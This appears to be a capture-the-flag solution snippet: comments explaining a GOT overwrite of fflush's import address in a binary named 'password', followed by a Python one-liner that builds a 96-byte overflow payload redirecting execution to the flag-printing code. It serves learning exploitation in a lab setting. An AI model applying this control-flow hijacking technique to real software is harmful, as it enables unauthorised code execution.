# What we want is to override the fflush import address,
# so instead of jumping into the fflush implementation it will
# jump to the wanted area inside the code that prints the flag

# By using readelf -a on the executable 'password' we derive the 
# fflush address: 0x0804a004

# We want to jump to address 0x080485d7 which is the address that
# prints login-ok and then the flag.
python -c "print('a' * 96 + '\x04\xa0\x04\x08' + '\n' + str(0x080485d7) + '\n')" > /tmp/pc/input
